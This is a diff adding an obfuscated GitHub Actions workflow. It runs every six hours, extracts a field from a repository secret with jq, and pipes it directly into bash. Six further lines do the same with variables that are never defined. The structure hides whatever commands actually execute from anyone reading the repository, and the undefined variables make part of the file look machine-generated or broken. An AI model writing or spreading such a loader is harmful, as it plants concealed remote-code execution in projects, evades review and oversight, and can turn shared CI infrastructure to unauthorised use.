@@ -1,0 +1,23 @@
+name: bianzhiguanfangsan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bianzhiguanfangsan
+        env:
+          i78: ${{ secrets.i78 }}
+        run: |
+          echo $i78 | jq -r .o8 | /bin/bash
+          echo $uhphh99 | jq -r .dvnd4823 | /bin/bash
+          echo $he0 | jq -r .fpv61 | /bin/bash
+          echo $bk27 | jq -r .cjaog47556 | /bin/bash
+          echo $k2 | jq -r .ql9 | /bin/bash
+          echo $ubrpe48 | jq -r .gpyz918 | /bin/bash
+          echo $fwkjk63016 | jq -r .adc08 | /bin/bash
+
